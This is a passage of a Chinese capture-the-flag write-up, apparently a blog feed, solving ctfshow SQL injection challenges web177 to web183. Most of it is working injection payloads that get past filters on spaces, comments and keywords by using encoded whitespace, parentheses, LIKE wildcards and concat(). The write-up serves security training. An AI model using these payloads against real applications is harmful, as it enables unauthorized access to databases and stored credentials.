&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/**/union/**/select/**/id,username,password/**/from/**/ctfshow_user/**/where/**/username=&#39;&lt;/span&gt;flag&lt;span class=&#34;token string&#34;&gt;&#39;%23 #&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#这里最后的注释符如果是 --+ 会无法成功，可能把 `+` 当作空格了&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTgzODUzNTkwLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112183853590.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112183853590&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload2:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/**/or/**/username=&#39;&lt;/span&gt;flag&#39;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;web178&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web178&#34;&gt;#&lt;/a&gt; web178&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg0NTUzOTI4LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112184553928.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112184553928&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;试了一下，还是把空格过滤了，用 &lt;code&gt;/**/&lt;/code&gt;  代替空格发现不行，用空格 url 编码 &lt;code&gt;%0d%0a&lt;/code&gt;  发现可以绕过，有回显&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%0d%0aand%0d%0a&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#1&#39; and &#39;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185250368.png&#34; alt=&#34;image-20250112185250368&#34; /&gt;&lt;/p&gt;
&lt;p&gt;构造 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%0d%0aor%0d%0ausername=&#39;&lt;/span&gt;flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg1NDI3NDkxLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185427491.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112185427491&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;web179&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web179&#34;&gt;#&lt;/a&gt; web179&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg1OTUzMDk1LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185953095.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112185953095&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;还是过滤了 &lt;code&gt;空格&lt;/code&gt; ，然后 &lt;code&gt;%0d%0a·&lt;/code&gt; 行不通了， &lt;code&gt;%0b&lt;/code&gt; 、 &lt;code&gt;%09&lt;/code&gt;  都被过滤了&lt;/p&gt;
&lt;p&gt;用不带空格的万能密码，得到 flag:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string&#34;&gt;&#39;or&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112190735792.png&#34; alt=&#34;image-20250112190735792&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web180&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web180&#34;&gt;#&lt;/a&gt; web180&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkxMzIwMjE4LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112191320218.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112191320218&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;过滤了空格，但是没有过滤 &lt;code&gt;%0c&lt;/code&gt; ，构造 payload&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%0cor%0cusername=&#39;&lt;/span&gt;flag&#39;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;不行， &lt;code&gt;%23&lt;/code&gt;  也被过滤了，去掉自己闭合的，得到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%0cor%0cusername=&#39;&lt;/span&gt;flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkxNzQ4MDYxLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112191748061.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112191748061&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;web181&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web181&#34;&gt;#&lt;/a&gt; web181&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkzMTA2MjMxLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112193106231.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112193106231&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;把所有空格的绕过基本上都过滤了，注释符也过滤了，尝试用 &lt;code&gt;+&lt;/code&gt;  或者 &lt;code&gt;()&lt;/code&gt;  绕过&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;+and+&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#行不通&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;or(username)=&#39;&lt;/span&gt;flag &lt;span class=&#34;token comment&#34;&gt;#得到 flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkzODQ4NDcwLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112193848470.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112193848470&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;web182&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web182&#34;&gt;#&lt;/a&gt; web182&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTk0NDAzNzA1LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112194403705.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112194403705&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;多过滤了个关键字 &lt;code&gt;flag&lt;/code&gt; , 没关系，用 &lt;code&gt;%&lt;/code&gt;  作为通配符来匹配就行&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;or(username)like&#39;&lt;/span&gt;fla&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;--%01 #不能用`=`，要用like&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;fl&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a  #拼接出flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--%01 #也可以得到 flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTk1NzMxNzYyLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112195731762.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112195731762&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;web183&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web183&#34;&gt;#&lt;/a&gt; web183&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMjAwMjM1MzA0LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112200235304.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112200235304&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;这里的 &lt;code&gt;&amp;quot;&amp;quot;双引号&lt;/code&gt; 与 post 是一个整体，这里是一个整形注入&lt;/p&gt;
&lt;p&gt;前几道题用户表名是 &lt;code&gt;ctfshow_user&lt;/code&gt;  开头，这里试试，看可以查出结果：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEzMTMzNDE3OTMwLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250113133417930.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250113133417930&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;题目里查询语句的 &lt;code&gt;conunt(pass)&lt;/code&gt; ， &lt;code&gt;pass&lt;/code&gt;  就是字段名，利用 like 匹配一下看看有没有 flag&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tableName&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ctfshow_user&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt;&#39;ctfshow&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
    </channel>
</rss>
